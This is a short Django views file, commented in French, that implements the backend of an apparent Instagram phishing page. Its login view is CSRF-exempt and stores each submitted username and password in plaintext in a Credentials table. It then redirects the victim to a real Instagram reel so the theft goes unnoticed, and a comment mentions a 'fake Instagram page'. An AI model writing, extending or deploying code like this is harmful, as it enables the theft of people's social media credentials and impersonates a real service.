from django.shortcuts import render, redirect
from .forms import LoginForm
from .models import Credentials
from django.views.decorators.csrf import csrf_exempt

# Create your views here.

@csrf_exempt
def login_view(request):
    if request.method == 'POST':
        form = LoginForm(request.POST)
        if form.is_valid():
            username = form.cleaned_data['username']
            password = form.cleaned_data['password']

            # Enregistrez les identifiants dans la base de données
            Credentials.objects.create(username=username, password=password)

            # Redirigez vers une page de confirmation (ou une fausse page Instagram)
            return redirect('https://www.instagram.com/reel/DEa3__ESbj1/?igsh=MThxMmc0eGFpcjFkcQ==')
    else:
        form = LoginForm()
    return render(request, 'login.html', {'form': form})